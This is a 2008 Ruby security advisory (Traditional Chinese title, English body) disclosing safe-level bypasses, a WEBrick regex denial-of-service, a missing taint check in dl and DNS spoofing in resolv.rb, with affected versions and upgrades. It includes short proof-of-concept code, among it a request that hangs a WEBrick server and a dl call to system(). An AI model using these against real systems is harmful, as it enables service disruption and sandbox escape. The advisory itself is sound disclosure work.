---
layout: news_post
title: "Ruby中的多個安全漏洞"
author: "SJH"
lang: zh_tw
---

Ruby中發現多個安全漏洞。建議更新到最新的版本。

## Details

The following vulnerabilities have been discovered.

### Several vulnerabilities in safe level

Several vulnerabilities in safe level have been discovered.

* untrace\_var is permitted at safe level 4.

      trace_var(:$VAR) {|val| puts "$VAR = #{val}" }

      Thread.new do
       $SAFE = 4
       eval %q{
         proc = untrace_var :$VAR
         proc.first.call("aaa")
       }
      end.join

* $PROGRAM\_NAME may be modified at safe level 4.

      Thread.new do
       $SAFE = 4
       eval %q{$PROGRAM_NAME.replace "Hello, World!"}
      end.join

      $PROGRAM_NAME #=> "Hello, World!"

* Insecure methods may be called at safe level 1-3.

      class Hello
       def world
         Thread.new do
           $SAFE = 4
           msg = "Hello, World!"
           def msg.size
             self.replace self*10 # replace string
             1 # return wrong size
           end
           msg
         end.value
       end
      end

      $SAFE = 1 # or 2, or 3
      s = Hello.new.world
      if s.kind_of?(String)
       puts s if s.size < 20 # print string which size is less than 20
      end

* Syslog operations are permitted at safe level 4.

      require "syslog"

      Syslog.open

      Thread.new do
       $SAFE = 4
       eval %q{
         Syslog.log(Syslog::LOG_WARNING, "Hello, World!")
         Syslog.mask = Syslog::LOG_UPTO(Syslog::LOG_EMERG)
         Syslog.info("masked")
         Syslog.close
       }
      end.join

These vulnerabilities were reported by Keita Yamaguchi.

### DoS vulnerability in WEBrick

WEBrick::HTTP::DefaultFileHandler is faulty of exponential time taking
requests due to a backtracking regular expression in
WEBrick::HTTPUtils.split\_header\_value.

Exploitable server:

    require 'webrick'
    WEBrick::HTTPServer.new(:Port => 2000, :DocumentRoot => "/etc").start

Attack:

    require 'net/http'
    res = Net::HTTP.start("localhost", 2000) { |http|
      req = Net::HTTP::Get.new("/passwd")
      req['If-None-Match'] = %q{meh=""} + %q{foo="bar" } * 100
      http.request(req)
    }
    p res

The request likely won\'t finish in this universe.

This vulnerability was reported by Christian Neukirchen.

### Lack of taintness check in dl
{: #label-3}

dl doesn\'t check taintness, so it could allow attackers to call
dangerous functions.

    require 'dl'
    $SAFE = 1
    h = DL.dlopen(nil)
    sys = h.sym('system', 'IP')
    uname = 'uname -rs'.taint
    sys[uname]

This vulnerability was reported by sheepman.

### DNS spoofing vulnerability in resolv.rb

resolv.rb allow remote attackers to spoof DNS answers. This risk can be
reduced by randomness of DNS transaction IDs and source ports, so
resolv.rb is fixed to randomize them.

* see also: [CVE-2008-1447][1]

This vulnerability was reported by Tanaka Akira.

## Vulnerable versions

1.8 series
: * 1\.8.5 and all prior versions
  * 1\.8.6-p286 and all prior versions
  * 1\.8.7-p71 and all prior versions

1.9 series
: * r18423 and all prior revisions

## Solution

1.8 series
: Please upgrade to 1.8.6-p287, or 1.8.7-p72.

  * [&lt;URL:https://cache.ruby-lang.org/pub/ruby/1.8/ruby-1.8.6-p287.tar.gz&gt;][2]
  * [&lt;URL:https://cache.ruby-lang.org/pub/ruby/1.8/ruby-1.8.7-p72.tar.gz&gt;][3]

1.9 series

: Please check out the latest version using Subversion.

      $ svn co https://git.ruby-lang.org/ruby.git/tree/?id=master ruby

Please note that a package that corrects this weakness may already be
available through your package management software.

## Credit

Credit to Keita Yamaguchi, Christian Neukirchen, sheepman, and Tanaka
Akira for disclosing these problems to Ruby Security Team.

## Changes

* 2008-08-08 12:21 +09:00 fixed the revision number of ruby 1.9.
* 2008-08-11 11:23 +09:00 ruby 1.8對這些漏洞的修正. 請見 [Ruby 1.8.7-p72 and
  1.8.6-p287 釋出][4]



[1]: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-1447
[2]: https://cache.ruby-lang.org/pub/ruby/1.8/ruby-1.8.6-p287.tar.gz
[3]: https://cache.ruby-lang.org/pub/ruby/1.8/ruby-1.8.7-p72.tar.gz
[4]: {{ site.url }}/zh_tw/news/2008/09/16/ruby-1-8-7-p72-and-1-8-6-p287-released/
